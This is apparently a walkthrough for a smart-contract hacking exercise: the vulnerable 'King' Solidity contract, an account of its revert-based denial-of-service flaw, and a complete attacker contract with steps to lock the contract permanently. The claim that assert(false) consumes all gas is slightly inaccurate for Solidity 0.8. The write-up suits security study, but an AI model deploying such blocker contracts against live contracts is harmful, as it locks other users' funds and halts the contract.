contract code:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```
**Vulnerability:** The contract is vulnerable to a Denial of Service (DoS) attack through unexpected revert, commonly known as a "King of the Hill" lock. In Solidity, using .transfer() or .send() to forward funds to an address automatically bubbles up any failure or revert from the receiving party. Because the contract sends funds to the current king before updating the state to the new king, a malicious contract can purposefully reject all incoming ether. This halts the execution of the entire function, causing a perpetual revert for any future player and locking the throne permanently.

## Exploit Steps
1. Deploy a custom smart contract capable of triggering an absolute revert whenever it receives ether:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingBlocker {
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function attack(address payable _targetContract) external payable onlyOwner {
        (bool success, ) = _targetContract.call{value: msg.value}("");
        require(success);
    }

    receive() external payable {
        assert(false);
    }
}
```
2.Fund and Claim the Throne: Call the attack function on your deployed contract, passing the King instance address and providing enough value (ether) via the console or your deployment tool to meet or exceed the current prize.
3. Induce Permanent Denial of Service: Any subsequent player or the owner attempting to reclaim the throne will trigger the King contract's transfer line, forcing a call to your contract's receive function. The assert(false) will fail, consuming all their transaction gas and reverting their attempt.
4. Verify the State: Confirm that the throne is unbreachable by attempting a higher bid from a different account. The transaction will consistently fail with an execution reverted status.
